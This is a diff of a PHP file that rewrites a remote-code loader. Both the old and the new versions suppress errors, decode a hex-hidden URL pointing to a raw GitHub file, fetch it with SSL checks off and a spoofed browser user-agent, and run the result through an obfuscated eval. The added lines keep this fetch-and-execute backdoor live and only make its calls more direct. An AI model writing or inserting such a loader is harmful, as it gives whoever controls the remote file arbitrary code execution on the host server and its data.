@@ -2,33 +2,29 @@
 error_reporting(0);
 set_time_limit(0);
 
-$u = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f322e747874";
-$a = 'pack';
-$b = 'curl_init';
-$c = 'curl_setopt_array';
-$d = 'curl_exec';
-$e = 'curl_getinfo';
+function g_u() {
+    return pack("H*", "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f322e706870");
+}
 
-$ch = $b($a("H*", $u));
+$ch = curl_init(g_u());
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_SSL_VERIFYHOST => false,
+    CURLOPT_TIMEOUT        => 30,
+    CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+]);
 
-$opts = [
-    19913 => true,
-    52 => true,
-    64 => false,
-    81 => false,
-    13 => 30,
-    10018 => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0'
-];
-
-$c($ch, $opts);
-$res = $d($ch);
-$st = $e($ch, 2097154);
+$r = curl_exec($ch);
+$s = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 
-if ($st === 200 && $res) {
-    $f = "ev"."al";
+if ($s === 200 && $r) {
+    $x = "ev"."al";
     try {
-        $f('?>' . $res);
-    } catch (Throwable $t) {}
+        $x('?>' . $r);
+    } catch (Throwable $e) {
+    }
 }
 ?>
